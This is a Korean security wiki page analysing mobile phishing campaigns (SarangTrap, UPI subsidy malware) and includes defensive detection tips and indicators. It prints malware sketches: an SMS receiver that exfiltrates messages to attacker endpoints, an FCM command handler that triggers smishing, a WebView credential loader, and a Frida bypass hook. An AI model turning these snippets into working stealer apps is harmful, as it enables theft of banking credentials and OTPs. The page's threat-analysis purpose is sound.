# 모바일 피싱 및 악성 앱 배포 (안드로이드 및 iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> 이 페이지는 위협 행위자들이 피싱(SEO, 소셜 엔지니어링, 가짜 스토어, 데이팅 앱 등)을 통해 **악성 안드로이드 APK** 및 **iOS 모바일 구성 프로필**을 배포하는 데 사용하는 기술을 다룹니다.
> 이 자료는 Zimperium zLabs(2025)에 의해 폭로된 SarangTrap 캠페인과 기타 공개 연구에서 수정되었습니다.

## 공격 흐름

1. **SEO/피싱 인프라**
* 유사 도메인 수십 개 등록(데이팅, 클라우드 공유, 차량 서비스 등).
– Google에서 순위를 매기기 위해 `<title>` 요소에 현지 언어 키워드와 이모지를 사용합니다.
– *안드로이드*(`.apk`) 및 *iOS* 설치 지침을 동일한 랜딩 페이지에 호스팅합니다.
2. **1단계 다운로드**
* 안드로이드: *서명되지 않은* 또는 “제3자 스토어” APK에 대한 직접 링크.
* iOS: 악성 **mobileconfig** 프로필에 대한 `itms-services://` 또는 일반 HTTPS 링크(아래 참조).
3. **설치 후 소셜 엔지니어링**
* 첫 실행 시 앱이 **초대/검증 코드**를 요청합니다(독점 접근 환상).
* 코드는 **HTTP로 POST**되어 Command-and-Control (C2)로 전송됩니다.
* C2는 `{"success":true}`로 응답 ➜ 악성코드가 계속 실행됩니다.
* 유효한 코드를 제출하지 않는 샌드박스/AV 동적 분석은 **악성 행동이 없음**을 확인합니다(회피).
4. **런타임 권한 남용** (안드로이드)
* 위험한 권한은 **긍정적인 C2 응답 후에만 요청**됩니다:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- 이전 빌드는 SMS 권한도 요청했습니다 -->
```
* 최근 변종은 `AndroidManifest.xml`에서 SMS에 대한 `<uses-permission>`을 **제거**하지만, SMS를 리플렉션을 통해 읽는 Java/Kotlin 코드 경로는 남겨둡니다 ⇒ `AppOps` 남용이나 이전 타겟을 통해 권한을 부여받는 장치에서 여전히 기능적입니다.
5. **페사드 UI 및 백그라운드 수집**
* 앱은 로컬에서 구현된 무해한 뷰(SMS 뷰어, 갤러리 선택기)를 표시합니다.
* 동시에 다음을 유출합니다:
- IMEI / IMSI, 전화번호
- 전체 `ContactsContract` 덤프 (JSON 배열)
- 크기를 줄이기 위해 [Luban](https://github.com/Curzibn/Luban)으로 압축된 `/sdcard/DCIM`의 JPEG/PNG
- 선택적 SMS 내용 (`content://sms`)
페이로드는 **배치 압축**되어 `HTTP POST /upload.php`를 통해 전송됩니다.
6. **iOS 배포 기술**
* 단일 **모바일 구성 프로필**이 `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` 등을 요청하여 장치를 “MDM”-유사 감독에 등록할 수 있습니다.
* 소셜 엔지니어링 지침:
1. 설정 열기 ➜ *프로필 다운로드됨*.
2. *설치*를 세 번 탭합니다(피싱 페이지의 스크린샷).
3. 서명되지 않은 프로필을 신뢰합니다 ➜ 공격자가 *연락처* 및 *사진* 권한을 App Store 검토 없이 획득합니다.
7. **네트워크 레이어**
* 일반 HTTP, 종종 포트 80에서 `api.<phishingdomain>.com`과 같은 HOST 헤더로.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (TLS 없음 → 쉽게 탐지 가능).

## 방어 테스트 / 레드팀 팁

* **동적 분석 우회** – 악성코드 평가 중 Frida/Objection을 사용하여 초대 코드 단계를 자동화하여 악성 분기로 도달합니다.
* **매니페스트 vs. 런타임 차이** – `aapt dump permissions`와 런타임 `PackageManager#getRequestedPermissions()`를 비교합니다; 위험한 권한이 누락된 경우 경고 신호입니다.
* **네트워크 카나리** – 코드 입력 후 불안정한 POST 폭주를 감지하기 위해 `iptables -p tcp --dport 80 -j NFQUEUE`를 구성합니다.
* **mobileconfig 검사** – macOS에서 `security cms -D -i profile.mobileconfig`를 사용하여 `PayloadContent`를 나열하고 과도한 권한을 찾아냅니다.

## 블루팀 탐지 아이디어

* **인증서 투명성 / DNS 분석**을 통해 키워드가 풍부한 도메인의 갑작스러운 폭주를 포착합니다.
* **User-Agent 및 경로 정규 표현식**: `(?i)POST\s+/(check|upload)\.php`를 Google Play 외부의 Dalvik 클라이언트에서 사용합니다.
* **초대 코드 텔레메트리** – APK 설치 직후 6–8자리 숫자 코드의 POST는 스테이징을 나타낼 수 있습니다.
* **MobileConfig 서명** – MDM 정책을 통해 서명되지 않은 구성 프로필을 차단합니다.

## 유용한 Frida 스니펫: 초대 코드 자동 우회
```python
# frida -U -f com.badapp.android -l bypass.js --no-pause
# Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
## 지표 (일반)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView 결제 피싱 (UPI) – 드로퍼 + FCM C2 패턴

이 패턴은 인도 UPI 자격 증명과 OTP를 훔치기 위해 정부 혜택 테마를 악용하는 캠페인에서 관찰되었습니다. 운영자는 배달과 복원력을 위해 신뢰할 수 있는 플랫폼을 연결합니다.

### 신뢰할 수 있는 플랫폼을 통한 배달 체인
- YouTube 비디오 유인 → 설명에 짧은 링크 포함
- 짧은 링크 → 합법적인 포털을 모방한 GitHub Pages 피싱 사이트
- 동일한 GitHub 리포지토리는 파일에 직접 연결된 가짜 “Google Play” 배지를 가진 APK를 호스팅
- 동적 피싱 페이지는 Replit에서 운영; 원격 명령 채널은 Firebase Cloud Messaging (FCM)을 사용

### 임베디드 페이로드와 오프라인 설치가 포함된 드로퍼
- 첫 번째 APK는 실제 악성코드를 `assets/app.apk`에 배송하고 사용자가 클라우드 탐지를 무력화하기 위해 Wi‑Fi/모바일 데이터를 비활성화하도록 유도하는 설치 프로그램(드로퍼)입니다.
- 임베디드 페이로드는 무해한 레이블(예: “보안 업데이트”) 아래에 설치됩니다. 설치 후, 설치 프로그램과 페이로드는 별도의 앱으로 존재합니다.

정적 분류 팁 (임베디드 페이로드 검색):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### 단기 링크를 통한 동적 엔드포인트 발견
- 악성 소프트웨어는 단기 링크에서 실시간 엔드포인트의 일반 텍스트, 쉼표로 구분된 목록을 가져옵니다; 간단한 문자열 변환으로 최종 피싱 페이지 경로를 생성합니다.

예시 (정리됨):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
의사 코드:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### WebView 기반 UPI 자격 증명 수집
- “₹1 / UPI‑Lite 결제하기” 단계는 WebView 내의 동적 엔드포인트에서 공격자의 HTML 양식을 로드하고 민감한 필드(전화, 은행, UPI PIN)를 캡처하여 `addup.php`로 `POST`합니다.

최소 로더:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### 자기 전파 및 SMS/OTP 가로채기
- 첫 실행 시 공격적인 권한 요청:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- 연락처는 피해자의 장치에서 스미싱 SMS를 대량 전송하기 위해 루프됩니다.
- 수신된 SMS는 브로드캐스트 리시버에 의해 가로채어지고 메타데이터(발신자, 본문, SIM 슬롯, 장치별 랜덤 ID)와 함께 `/addsm.php`에 업로드됩니다.

Receiver sketch:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) as resilient C2
- 페이로드는 FCM에 등록됩니다; 푸시 메시지는 동작을 트리거하는 데 사용되는 `_type` 필드를 포함합니다 (예: 피싱 텍스트 템플릿 업데이트, 행동 전환).

Example FCM payload:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
핸들러 스케치:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### 사냥 패턴 및 IOC
- APK는 `assets/app.apk`에 보조 페이로드를 포함합니다.
- WebView는 `gate.htm`에서 결제를 로드하고 `/addup.php`로 유출합니다.
- SMS 유출은 `/addsm.php`로 진행됩니다.
- 단축 링크 기반 구성 가져오기 (예: `rebrand.ly/*`)가 CSV 엔드포인트를 반환합니다.
- 일반 “업데이트/보안 업데이트”로 라벨이 붙은 앱들.
- 신뢰할 수 없는 앱에서 `_type` 구분자가 있는 FCM `data` 메시지.

### 탐지 및 방어 아이디어
- 설치 중 사용자에게 네트워크 비활성화를 지시하고 `assets/`에서 두 번째 APK를 사이드 로드하도록 하는 앱에 플래그를 지정합니다.
- 권한 튜플: `READ_CONTACTS` + `READ_SMS` + `SEND_SMS` + WebView 기반 결제 흐름에 대한 경고.
- 비기업 호스트에서 `POST /addup.php|/addsm.php`에 대한 이그레스 모니터링; 알려진 인프라 차단.
- 모바일 EDR 규칙: FCM에 등록하고 `_type` 필드에 따라 분기하는 신뢰할 수 없는 앱.

---

## 참조

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)

{{#include ../../banners/hacktricks-training.md}}
